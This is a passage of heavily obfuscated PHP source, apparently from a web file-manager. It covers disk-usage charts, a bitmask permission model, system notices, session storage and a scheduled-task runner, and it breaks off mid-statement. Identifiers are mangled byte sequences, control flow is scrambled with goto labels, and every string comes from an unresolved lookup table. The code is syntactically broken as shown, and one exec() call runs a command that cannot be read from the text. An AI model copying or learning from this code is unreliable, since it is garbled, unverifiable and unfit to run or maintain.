goto eµÂ¿ÂØîÎ; C™‚¾ˆƒ„ä: } private function diskDriver() { goto f¹ØŒÏ‡ê; E´„“šÛ‘: $C’”Š„ØøÄ = $EŒğÆ©ÑÄ‡ - @disk_free_space($F¨Ãæ‡Ÿ½å); return array($F›Ä„áØ [2079] => $EŒğÆ©ÑÄ‡, $F›Ä„áØ [2081] => $C’”Š„ØøÄ); goto E”íª§¨Ï»; f¹ØŒÏ‡ê: $F›Ä„áØ  =& $_SERVER[“]; $F¨Ãæ‡Ÿ½å = $F›Ä„áØ [8]; $d±¸ê¶¸–ç = $GLOBALS[$F›Ä„áØ [6]][$F›Ä„áØ [2090]] == $F›Ä„áØ [2091]; goto C¬Ó™Ûº–Ë; C¬Ó™Ûº–Ë: if ($d±¸ê¶¸–ç) { $F¨Ãæ‡Ÿ½å = $F›Ä„áØ [2092]; if (function_exists($F›Ä„áØ [2093])) { exec($F›Ä„áØ [2094], $BŠŸÏ‹Ùõ); $F¨Ãæ‡Ÿ½å = $BŠŸÏ‹Ùõ[1] . $F›Ä„áØ [8]; } } if (!file_exists($F¨Ãæ‡Ÿ½å)) { return; } $EŒğÆ©ÑÄ‡ = @disk_total_space($F¨Ãæ‡Ÿ½å); goto E´„“šÛ‘; E”íª§¨Ï»: } public function fileChart($F±ŸÎ—‘¶) { goto dãÑ¹Ñœ·À; c÷ÓáŒÍé›: $bê¿¯íµß = $this->sourceSize(); $fœŒ–œÚôù = array($BÑˆŠâ¿ÌÍ[463] => 0, $BÑˆŠâ¿ÌÍ[371] => 1); $B‚Ÿ¨Ü†ó… = Model($BÑˆŠâ¿ÌÍ[736])->where($fœŒ–œÚôù)->sum($BÑˆŠâ¿ÌÍ[77]); goto E­…œ³½ø–; dãÑ¹Ñœ·À: $BÑˆŠâ¿ÌÍ =& $_SERVER[“]; if (isset($F±ŸÎ—‘¶[$BÑˆŠâ¿ÌÍ[1423]])) { return Model($BÑˆŠâ¿ÌÍ[736])->userFileTypeProfile($F±ŸÎ—‘¶[$BÑˆŠâ¿ÌÍ[1423]]); } if (isset($F±ŸÎ—‘¶[$BÑˆŠâ¿ÌÍ[2095]])) { return Model($BÑˆŠâ¿ÌÍ[736])->groupFileTypeProfile($F±ŸÎ—‘¶[$BÑˆŠâ¿ÌÍ[2095]]); } goto c÷ÓáŒÍé›; E­…œ³½ø–: $fœŒ–œÚôù[$BÑˆŠâ¿ÌÍ[371]] = 2; $c¥—îõ…•¸ = Model($BÑˆŠâ¿ÌÍ[736])->where($fœŒ–œÚôù)->sum($BÑˆŠâ¿ÌÍ[77]); return array($BÑˆŠâ¿ÌÍ[682] => $bê¿¯íµß[$BÑˆŠâ¿ÌÍ[77]], $BÑˆŠâ¿ÌÍ[2025] => $bê¿¯íµß[$BÑˆŠâ¿ÌÍ[2025]], $BÑˆŠâ¿ÌÍ[2026] => (int) $B‚Ÿ¨Ü†ó…, $BÑˆŠâ¿ÌÍ[2027] => (int) $c¥—îõ…•¸); goto A§ª×¼•†Ç; A§ª×¼•†Ç: } private function sourceSize() { $a¥£ÒÃŒ§å =& $_SERVER[“]; $EËÚÕ¯‰‹ = Model($a¥£ÒÃŒ§å[736])->where(array($a¥£ÒÃŒ§å[370] => 0))->sum($a¥£ÒÃŒ§å[77]); $aˆ•‚Æ¸‘ = Model($a¥£ÒÃŒ§å[422])->sum($a¥£ÒÃŒ§å[77]); if ($aˆ•‚Æ¸‘ > $EËÚÕ¯‰‹) { $aˆ•‚Æ¸‘ = $EËÚÕ¯‰‹; } return array($a¥£ÒÃŒ§å[77] => (int) $EËÚÕ¯‰‹, $a¥£ÒÃŒ§å[2025] => (int) $aˆ•‚Æ¸‘); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $aÑíï„µ• =& $_SERVER[“]; $f§ÕŞƒÔ¶â = array(array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2096]), $aÑíï„µ•[2097] => $aÑíï„µ•[2098], $aÑíï„µ•[2099] => 6, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2102]), $aÑíï„µ•[2097] => $aÑíï„µ•[2103], $aÑíï„µ•[2099] => 1, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2104]), $aÑíï„µ•[2097] => $aÑíï„µ•[2105], $aÑíï„µ•[2099] => 2, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2106]), $aÑíï„µ•[2097] => $aÑíï„µ•[2105], $aÑíï„µ•[2099] => 3, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2107]), $aÑíï„µ•[2097] => $aÑíï„µ•[2108], $aÑíï„µ•[2099] => 4, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_VIEW), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2109]), $aÑíï„µ•[2097] => $aÑíï„µ•[2110], $aÑíï„µ•[2099] => 5, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($aÑíï„µ•[386] => LNG($aÑíï„µ•[2111]), $aÑíï„µ•[2097] => $aÑíï„µ•[2112], $aÑíï„µ•[2099] => 7, $aÑíï„µ•[2100] => 1, $aÑíï„µ•[2101] => 0)); return $f§ÕŞƒÔ¶â; } public static function authCheck($FÇ÷œ¬‘¾ø, $f‹Œò÷“Ò) { $FÇ÷œ¬‘¾ø = intval($FÇ÷œ¬‘¾ø); if (_get($GLOBALS, $_SERVER[“][459])) { return !0; } if ($FÇ÷œ¬‘¾ø <= 0) { return !1; } if (($FÇ÷œ¬‘¾ø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($FÇ÷œ¬‘¾ø & $f‹Œò÷“Ò); } public static function authCheckShow($fİ­£Êß»½) { return self::authCheck($fİ­£Êß»½, self::AUTH_SHOW); } public static function authCheckView($AºöÈÅŸËß) { return self::authCheck($AºöÈÅŸËß, self::AUTH_VIEW); } public static function authCheckDownload($Fš×ŸÕÇ) { return self::authCheck($Fš×ŸÕÇ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($cêò°ˆ´Àè) { return self::authCheck($cêò°ˆ´Àè, self::AUTH_UPLOAD); } public static function authCheckEdit($E³¿ØªÍƒŞ) { return self::authCheck($E³¿ØªÍƒŞ, self::AUTH_EDIT); } public static function authCheckRemove($AÃº©•Úœ) { return self::authCheck($AÃº©•Úœ, self::AUTH_REMOVE); } public static function authCheckShare($FÀº“Ë÷¾) { return self::authCheck($FÀº“Ë÷¾, self::AUTH_SHARE); } public static function authCheckComment($f˜Ò‘à‰Í…) { return self::authCheck($f˜Ò‘à‰Í…, self::AUTH_COMMENT); } public static function authCheckEvent($Fé¨”Ê–Ÿñ) { return self::authCheck($Fé¨”Ê–Ÿñ, self::AUTH_EVENT); } public static function authCheckRoot($A°ÅªŞë´ß) { return self::authCheck($A°ÅªŞë´ß, self::AUTH_ROOT); } public static function authDisable($c“ÈÁ›ì¹, $eŞÈ†Œƒ‚¶) { if (intval($c“ÈÁ›ì¹) <= 0) { return 0; } return intval($c“ÈÁ›ì¹) & ~$eŞÈ†Œƒ‚¶; } public $optionType = "\x53\x79\x73\164\x65\155\x2e\x73\x6f\165\x72\143\x65\x41\165\x74\150\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x61\165\164\150", "\154\141\x62\x65\x6c", "\x64\151\x73\x70\154\141\171", "\163\x79\163\164\145\155", "\x73\157\162\x74"); public function initData() { $C·¶‹ÏÊÜ· = $this->authDefault(); foreach ($C·¶‹ÏÊÜ· as $Fáç¿ö›à‡) { $this->add($Fáç¿ö›à‡); } } public function listData($e¾¦ïçÔŠ— = false, $A‰ßÒ«¡Ø = "\x73\x6f\162\x74", $D¤İùÙŠ“ = false) { return parent::listData($e¾¦ïçÔŠ—, $A‰ßÒ«¡Ø, $D¤İùÙŠ“); } public function update($Eà„‘æ´›Œ, $b±ó„•®¿Û) { $Aˆ‡ñ·Ê¿Ï =& $_SERVER[“]; $d¾É‹»¡ÌŠ = parent::listData($Eà„‘æ´›Œ); $E¹×œ¼ÃÕ = $this->findByName($b±ó„•®¿Û[$Aˆ‡ñ·Ê¿Ï[28]]); if (!$d¾É‹»¡ÌŠ || $E¹×œ¼ÃÕ && $E¹×œ¼ÃÕ[$Aˆ‡ñ·Ê¿Ï[367]] != $d¾É‹»¡ÌŠ[$Aˆ‡ñ·Ê¿Ï[367]]) { return !1; } $this->filterAuth($b±ó„•®¿Û[$Aˆ‡ñ·Ê¿Ï[376]]); return parent::update($Eà„‘æ´›Œ, $b±ó„•®¿Û); } public function remove($a‹Ê¢Ç—Àß) { $E·Œ¤„£î¹ = parent::listData($a‹Ê¢Ç—Àß); if (!$E·Œ¤„£î¹ || $E·Œ¤„£î¹[$_SERVER[“][1067]]) { return !1; } return parent::remove($a‹Ê¢Ç—Àß); } public function add($B¿†óçÙƒ = array()) { goto D´»Õ–¸‰Ç; D´»Õ–¸‰Ç: $e©„ŸÜ„ =& $_SERVER[“]; if ($this->findByName($B¿†óçÙƒ[$e©„ŸÜ„[28]])) { return !1; } $A÷ùßŒï«ï = array($e©„ŸÜ„[28] => $e©„ŸÜ„[33], $e©„ŸÜ„[376] => 1, $e©„ŸÜ„[2113] => $e©„ŸÜ„[2114], $e©„ŸÜ„[2115] => 1, $e©„ŸÜ„[1067] => 0, $e©„ŸÜ„[2116] => 0); goto CŞ•êîÉÅ; f×¸ìÏ±ø¿: return parent::insert($B¿†óçÙƒ); goto a“¹íğ½ù; CŞ•êîÉÅ: $B¿†óçÙƒ = array_merge($A÷ùßŒï«ï, $B¿†óçÙƒ); $B¿†óçÙƒ[$e©„ŸÜ„[2116]] = $this->getSort(); $this->filterAuth($B¿†óçÙƒ[$e©„ŸÜ„[376]]); goto f×¸ìÏ±ø¿; a“¹íğ½ù: } private function getSort() { $bŞàó’Ê®‘ =& $_SERVER[“]; $e¤‡øŠâ‘Æ = parent::listData(); $cõˆ¡ğÁƒÕ = array_to_keyvalue($e¤‡øŠâ‘Æ, $bŞàó’Ê®‘[33], $bŞàó’Ê®‘[2116]); return empty($cõˆ¡ğÁƒÕ) ? 0 : max($cõˆ¡ğÁƒÕ) + 1; } private function filterAuth(&$cÁ‘‡¼ˆ£Ö) { goto f½ˆè…¸¬º; f½ˆè…¸¬º: if (!$cÁ‘‡¼ˆ£Ö) { return; } $fÄø…Ö ¢² = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Eäİ¥«‚¼˜ = array(); goto DÅ˜±Ê§ìã; D¯æÉŒ’Çè: foreach ($Eäİ¥«‚¼˜ as $D©µ‡î¬ù) { if (isset($B¡ÒŠé÷«ƒ[$D©µ‡î¬ù])) { $Eäİ¥«‚¼˜ = array_merge($Eäİ¥«‚¼˜, $B¡ÒŠé÷«ƒ[$D©µ‡î¬ù]); } } $Eäİ¥«‚¼˜[] = self::AUTH_SHOW; $cÁ‘‡¼ˆ£Ö = array_sum(array_unique($Eäİ¥«‚¼˜)); goto BÀÍÃÄ”ç‡; DÅ˜±Ê§ìã: foreach ($fÄø…Ö ¢² as $D©µ‡î¬ù) { if ($cÁ‘‡¼ˆ£Ö & $D©µ‡î¬ù) { $Eäİ¥«‚¼˜[] = $D©µ‡î¬ù; } } if (in_array(self::AUTH_ROOT, $Eäİ¥«‚¼˜)) { $cÁ‘‡¼ˆ£Ö = array_sum($fÄø…Ö ¢²); return; } $B¡ÒŠé÷«ƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto D¯æÉŒ’Çè; BÀÍÃÄ”ç‡: } public function sort($a±Ğ¡ ›ª÷, $c­ŠöƒÊë¡) { return parent::update($a±Ğ¡ ›ª÷, $c­ŠöƒÊë¡); } } goto dÊÔç”°ï; aê¶ÚÁ“á: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\156\x6f\x74\151\143\145\114\151\x73\164"; public $field = array("\156\141\155\145", "\x63\x6f\x6e\164\x65\156\164", "\x61\x75\x74\150", "\155\x6f\144\x65", "\164\151\x6d\145", "\164\171\160\145", "\154\145\166\x65\154", "\145\156\x61\142\x6c\x65", "\163\157\162\x74"); public function listData($CŞ¼¶Ãšá³ = false, $bõåÎºë·Ÿ = "\x73\157\x72\164", $bí´ô÷ˆ›‰ = false) { return parent::listData($CŞ¼¶Ãšá³, $bõåÎºë·Ÿ, $bí´ô÷ˆ›‰); } public function add($Bê¶ãñ•ª) { $CìÈ¯¡İˆİ =& $_SERVER[“]; $FÙŒß‚½š» = time(); if ($Bê¶ãñ•ª[$CìÈ¯¡İˆİ[12]] == $CìÈ¯¡İˆİ[2482]) { $FÙŒß‚½š» = strtotime($Bê¶ãñ•ª[$CìÈ¯¡İˆİ[190]]); } $Bê¶ãñ•ª[$CìÈ¯¡İˆİ[190]] = $FÙŒß‚½š»; return parent::insert($Bê¶ãñ•ª); } public function update($d‡¶­ëº©¬, $F”†Ï§ ») { goto c ŞÇä‹Ä; Bšîˆ¹¼’ª: $eÜÂ‹Öš = time(); if ($F”†Ï§ »[$C¬ÓÀ©†ã[12]] == $C¬ÓÀ©†ã[2482]) { $eÜÂ‹Öš = strtotime($F”†Ï§ »[$C¬ÓÀ©†ã[190]]); } $F”†Ï§ »[$C¬ÓÀ©†ã[190]] = $eÜÂ‹Öš; goto f£©ó²ÇßÂ; c ŞÇä‹Ä: $C¬ÓÀ©†ã =& $_SERVER[“]; $D«»òÁ±‘ = $this->listData($d‡¶­ëº©¬); if (!$D«»òÁ±‘) { return !1; } goto Bšîˆ¹¼’ª; f£©ó²ÇßÂ: return parent::update($d‡¶­ëº©¬, $F”†Ï§ »); goto EšÆñ¢; EšÆñ¢: } public function remove($E¿øËº¡¼®) { $bÛĞ¥áìÆ² = $this->listData($E¿øËº¡¼®); if (!$bÛĞ¥áìÆ² || $bÛĞ¥áìÆ²[$_SERVER[“][1067]]) { return !1; } return parent::remove($E¿øËº¡¼®); } public function sort($fâœÃ’ºÇİ, $dô ‹†ÆŞõ) { return parent::update($fâœÃ’ºÇİ, $dô ‹†ÆŞõ); } public function enable($C¥¼‹Ìî‘², $cÃ­µõ¸»²) { return parent::update($C¥¼‹Ìî‘², array($_SERVER[“][2483] => $cÃ­µõ¸»²)); } private function initUserOption() { $cãÜŸ›ñ‚ã =& $_SERVER[“]; $this->optionType = $cãÜŸ›ñ‚ã[2484]; $this->modelType = $cãÜŸ›ñ‚ã[2485]; $this->field = array($cãÜŸ›ñ‚ã[2486], $cãÜŸ›ñ‚ã[28], $cãÜŸ›ñ‚ã[190], $cãÜŸ›ñ‚ã[29], $cãÜŸ›ñ‚ã[2487], $cãÜŸ›ñ‚ã[673], $cãÜŸ›ñ‚ã[183]); } public function userNoticeGet($C³áĞ¿â±Ğ = false) { $this->initUserOption(); return parent::listData($C³áĞ¿â±Ğ, $_SERVER[“][367], !0); } public function userNoticeAdd($eŒ¼·©õ¬Ô) { $C –»§‡¢ =& $_SERVER[“]; $this->initUserOption(); $cÒ¯ÈåâØâ = $this->findByKey($C –»§‡¢[2486], $eŒ¼·©õ¬Ô[$C –»§‡¢[367]]); if ($cÒ¯ÈåâØâ) { return !0; } $EÌ¤±“Œ„ = array($C –»§‡¢[2486] => $eŒ¼·©õ¬Ô[$C –»§‡¢[367]], $C –»§‡¢[28] => $eŒ¼·©õ¬Ô[$C –»§‡¢[28]], $C –»§‡¢[190] => $eŒ¼·©õ¬Ô[$C –»§‡¢[190]], $C –»§‡¢[29] => isset($eŒ¼·©õ¬Ô[$C –»§‡¢[29]]) ? $eŒ¼·©õ¬Ô[$C –»§‡¢[29]] : 1, $C –»§‡¢[2487] => isset($eŒ¼·©õ¬Ô[$C –»§‡¢[2487]]) ? $eŒ¼·©õ¬Ô[$C –»§‡¢[2487]] : 0, $C –»§‡¢[673] => 0, $C –»§‡¢[183] => 0); return parent::insert($EÌ¤±“Œ„); } public function userNoticeEdit($eÓ˜Ê…÷†, $F—ƒç¥²¢) { $this->initUserOption(); return parent::update($eÓ˜Ê…÷†, $F—ƒç¥²¢); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\x6d\137\157\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\x72\x6f\x6c\145", "\162\157\154\x65\107\x72\x6f\165\160", "\x72\145\147\x69\163\x74", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($aÄªó…×Õ‹) { return "\123\x79\x73\164\145\x6d\x4f\x70\x74\151\x6f\156\137{$aÄªó…×Õ‹}"; } protected function optionDefault($dÊ©‹ùÌ„Ø = '') { $bğÏÜ†´Ğ‹ =& $_SERVER[“]; if ($dÊ©‹ùÌ„Ø == $bğÏÜ†´Ğ‹[33]) { return $GLOBALS[$bğÏÜ†´Ğ‹[6]][$bğÏÜ†´Ğ‹[2488]]; } } } class SystemRecordModel extends ModelBaseLight { } goto eÂĞ£Ååô; c¦ëÇ‚¾²: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Dñ¼¹ù­ö; A„‡ò‚ ¹©: $CÕº©ÚòĞ„ = $GLOBALS[$c‚ É˜ƒëå[6]][$c‚ É˜ƒëå[337]]; self::$sessionTime = $CÕº©ÚòĞ„[$c‚ É˜ƒëå[1382]]; $FÓ­½”ï‚ø = isset($GLOBALS[$c‚ É˜ƒëå[1383]]) ? $GLOBALS[$c‚ É˜ƒëå[1383]] : SESSION_ID; goto a®ƒƒÒãß; Dñ¼¹ù­ö: $c‚ É˜ƒëå =& $_SERVER[“]; static $CÍç–‘Š×¼ = false; if ($CÍç–‘Š×¼) { return $CÍç–‘Š×¼; } goto A„‡ò‚ ¹©; c Ÿ‘„°òŒ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $CÍç–‘Š×¼ = new self(); return $CÍç–‘Š×¼; goto cØáÛŠç¸±; a®ƒƒÒãß: if (self::$sessionSign) { } else { if (Cookie::get($FÓ­½”ï‚ø)) { self::$sessionSign = Cookie::get($FÓ­½”ï‚ø); } else { self::$sessionSign = guid(); } } Cookie::setSafe($FÓ­½”ï‚ø, self::$sessionSign, self::$sessionTime); $eãõ•©Éƒ  = $CÕº©ÚòĞ„[$c‚ É˜ƒëå[1384]]; goto CğïÕ½Ó’; CğïÕ½Ó’: $a’ˆçø¸ËÓ = $CÕº©ÚòĞ„[$eãõ•©Éƒ ]; $d£‘¡™„Ş = $CÕº©ÚòĞ„[$c‚ É˜ƒëå[739]]; switch ($eãõ•©Éƒ ) { case $c‚ É˜ƒëå[17]: self::$handle = Model($c‚ É˜ƒëå[740]); break; case $c‚ É˜ƒëå[741]: self::$handle = new CacheRedis($a’ˆçø¸ËÓ, $d£‘¡™„Ş); break; case $c‚ É˜ƒëå[742]: self::$handle = new CacheMemcached($a’ˆçø¸ËÓ, $d£‘¡™„Ş); break; case $c‚ É˜ƒëå[167]: $a’ˆçø¸ËÓ[$c‚ É˜ƒëå[75]] = $a’ˆçø¸ËÓ[$c‚ É˜ƒëå[75]] . $c‚ É˜ƒëå[1385]; self::$handle = new CacheFile($a’ˆçø¸ËÓ, $d£‘¡™„Ş); default: break; } goto c Ÿ‘„°òŒ; cØáÛŠç¸±: } public static function sign($D‹Üƒ›À = false) { $D‹Üƒ›À && (self::$sessionSign = $D‹Üƒ›À); self::init(); return self::$sessionSign; } public static function set($dö¹’²²æò, $C‰Ãå¾Â®¶ = false) { self::init(); if (is_array($dö¹’²²æò)) { foreach ($dö¹’²²æò as $aª¦ïÆÕöÈ => $C±®Ä³ç) { array_set_value(self::$data, $aª¦ïÆÕöÈ, $C±®Ä³ç); } } else { array_set_value(self::$data, $dö¹’²²æò, $C‰Ãå¾Â®¶); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($eç¢ˆç°„¥ = false) { self::init(); if (!$eç¢ˆç°„¥) { return self::$data; } return array_get_value(self::$data, $eç¢ˆç°„¥); } public static function remove($aÆÀ¿‘Ş”) { self::init(); unset(self::$data[$aÆÀ¿‘Ş”]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[“][744])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto A¡ß³İ±ÊÉ; f¹ƒ«æøä³: while (!0) { self::cacheClear(); if (self::valueGet($bÈ—¡Â¾œô[673]) != $bÈ—¡Â¾œô[83]) { self::valueSet($bÈ—¡Â¾œô[1386], $bÈ—¡Â¾œô[470]); self::log($bÈ—¡Â¾œô[1390]); die; } self::valueSet($bÈ—¡Â¾œô[1386], $bÈ—¡Â¾œô[83]); self::valueSet($bÈ—¡Â¾œô[1387], time()); self::taskRunAll(); sleep(self::valueGet($bÈ—¡Â¾œô[1391])); } goto cÍ®êåÖ»; A¡ß³İ±ÊÉ: $bÈ—¡Â¾œô =& $_SERVER[“]; if (self::valueGet($bÈ—¡Â¾œô[673]) != $bÈ—¡Â¾œô[83]) { return; } if (self::valueGet($bÈ—¡Â¾œô[1386]) == $bÈ—¡Â¾œô[83]) { $BĞÌˆÓ‚æ· = self::valueGet($bÈ—¡Â¾œô[1387]); if (time() - $BĞÌˆÓ‚æ· > 3600 * 2) { self::restart(); } return; } goto AèÔøî³Ë­; AèÔøî³Ë­: http_close(); self::valueSet($bÈ—¡Â¾œô[1386], $bÈ—¡Â¾œô[83]); Hook::bind($bÈ—¡Â¾œô[1388], $bÈ—¡Â¾œô[1389]); goto f¹ƒ«æøä³; cÍ®êåÖ»: } public static function restart() { $D••™¼Ü°á =& $_SERVER[“]; http_close(); self::valueSet($D••™¼Ü°á[673], $D••™¼Ü°á[470]); sleep(self::valueGet($D••™¼Ü°á[1391]) + 5); self::valueSet($D••™¼Ü°á[1386], $D••™¼Ü°á[470]); self::valueSet($D••™¼Ü°á[673], $D••™¼Ü°á[83]); } public static function shutdownEvent() { $a†õó¤ÅãÂ =& $_SERVER[“]; self::valueSet($a†õó¤ÅãÂ[1386], $a†õó¤ÅãÂ[470]); self::log($a†õó¤ÅãÂ[1392]); } public static function config($FÎâ…õ×Ñ, $Bè¹ÅÁª–) { $EÂØò”Ã… =& $_SERVER[“]; $AöãèºÒŠ = 20; $Bè¹ÅÁª– = intval($Bè¹ÅÁª–) <= $AöãèºÒŠ ? $AöãèºÒŠ : intval($Bè¹ÅÁª–); self::valueSet($EÂØò”Ã…[673], $FÎâ…õ×Ñ); self::valueSet($EÂØò”Ã…[1391], $Bè¹ÅÁª–); } private static function taskRunAll() { $f“§¼¼œ =& $_SERVER[“]; $eì«‚ˆ¥—ø = Model($f“§¼¼œ[1393])->listData(); $Cœ‡ÊƒÊ• = count($eì«‚ˆ¥—ø); for ($F¡êŞÄäâ = 0; $F¡êŞÄäâ < $Cœ‡ÊƒÊ•; $F¡êŞÄäâ++) { $a“­Î–ŞÖè = $eì«‚ˆ¥—ø[$F¡êŞÄäâ]; if ($a“­Î–ŞÖè[$f“§¼¼œ[1394]] != $f“§¼¼œ[83]) { continue; } if (!self::taskTimeCheck($a“­Î–ŞÖè)) { continue; } self::taskRun($a“­Î–ŞÖè); } Hook::trigger($f“§¼¼œ[1395]); } private static function taskTimeCheck($aë¥ùÁ¥öÇ) { goto cØâ¹–æÜÂ; B‘œ£Ó‘¸ä: switch ($f°Ùå¶î´Ş[$càò³¢„ó§[29]]) { case $càò³¢„ó§[1402]: if (time() - $FÅ£ºŸßÁ < 3600 * 24 * 30) { return !1; } if ($f°Ùå¶î´Ş[$càò³¢„ó§[1402]] == date($càò³¢„ó§[1403]) && $EÁ¾ÏğĞ) { return !0; } break; case $càò³¢„ó§[1404]: if (time() - $FÅ£ºŸßÁ < 3600 * 24 * 7) { return !1; } $cÖ®ĞÒ¯« = date($càò³¢„ó§[1405]) == 0 ? 7 : date($càò³¢„ó§[1405]); if ($f°Ùå¶î´Ş[$càò³¢„ó§[1404]] == $cÖ®ĞÒ¯« && $EÁ¾ÏğĞ) { return !0; } break; case $càò³¢„ó§[1397]: if (time() - $FÅ£ºŸßÁ < 3600 * 24) { return !1; } if ($EÁ¾ÏğĞ) { return !0; } break; case $càò³¢„ó§[1406]: if (time() - $FÅ£ºŸßÁ >= floatval($f°Ùå¶î´Ş[$càò³¢„ó§[1406]]) * 60) { return !0; } break; default: break; } return !1; goto a’Çå›äÙç; cØâ¹–æÜÂ: $càò³¢„ó§ =& $_SERVER[“]; $f°Ùå¶î´Ş = json_decode($aë¥ùÁ¥öÇ[$càò³¢„ó§[190]], !0); $FÅ£ºŸßÁ = intval($aë¥ùÁ¥öÇ[$càò³¢„ó§[1387]]); goto D¥‹»äê¸¯; D¥‹»äê¸¯: $BíÇŒÎÎŠõ = strtotime($càò³¢„ó§[1396] . $f°Ùå¶î´Ş[$càò³¢„ó§[1397]] . $càò³¢„ó§[1398]) - strtotime($càò³¢„ó§[1399]); $D±áğÜ´— = time() - strtotime(date($càò³¢„ó§[1400]) . $càò³¢„ó§[1401]); $EÁ¾ÏğĞ = $D±áğÜ´— >= $BíÇŒÎÎŠõ && $D±áğÜ´— <= $BíÇŒÎÎŠõ + 3600; goto B‘œ£Ó‘¸ä; a’Çå›äÙç: } public static function taskRun($B˜ÂèÏˆ“ƒ) { goto D˜‰ÅñÀ°«; dŠ¹ä“ˆÄ: $c¸´šÀôù = timeFloat(); $C”“‹ßæÃ = $A¯ñ±è‰ô[33]; switch ($B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[29]]) { case $A¯ñ±è‰ô[295]: $C“àõ˜ˆ–É = url_request($B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[1410]], $A¯ñ±è‰ô[216], !1, !1, !1, !1, 5); $C”“‹ßæÃ = strlen($C“àõ˜ˆ–É); break; case $A¯ñ±è‰ô[215]: $C”“‹ßæÃ = Hook::apply($B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[1410]]); default: break; } goto b·ëĞÂ¡; D˜‰ÅñÀ°«: $A¯ñ±è‰ô =& $_SERVER[“]; self::log($A¯ñ±è‰ô[1407] . $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[367]] . $A¯ñ±è‰ô[1408] . $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[28]] . $A¯ñ±è‰ô[1409] . $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[1410]]); Model($A¯ñ±è‰ô[1393])->run($B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[367]]); goto dŠ¹ä“ˆÄ; b·ëĞÂ¡: Model($A¯ñ±è‰ô[1411])->add(array($A¯ñ±è‰ô[1412] => $A¯ñ±è‰ô[33], $A¯ñ±è‰ô[1413] => $A¯ñ±è‰ô[470], $A¯ñ±è‰ô[29] => $A¯ñ±è‰ô[1414] . $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[367]], $A¯ñ±è‰ô[1415] => json_encode(array($A¯ñ±è‰ô[28] => $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[28]], $A¯ñ±è‰ô[1416] => timeFloat() - $c¸´šÀôù, $A¯ñ±è‰ô[281] => $C”“‹ßæÃ)))); self::log($A¯ñ±è‰ô[1417] . $B˜ÂèÏˆ“ƒ[$A¯ñ±è‰ô[367]] . $A¯ñ±è‰ô[1418] . $C”“‹ßæÃ); return !0; goto A©„ŞÄŠ•; A©„ŞÄŠ•: } private static function valueGet($dóˆÌˆ¥¡) { $d†Èëå™Ğ˜ =& $_SERVER[“]; $aŒ†Š®—Òé = $d†Èëå™Ğ˜[1419]; $eÒñ ÓÖâš = 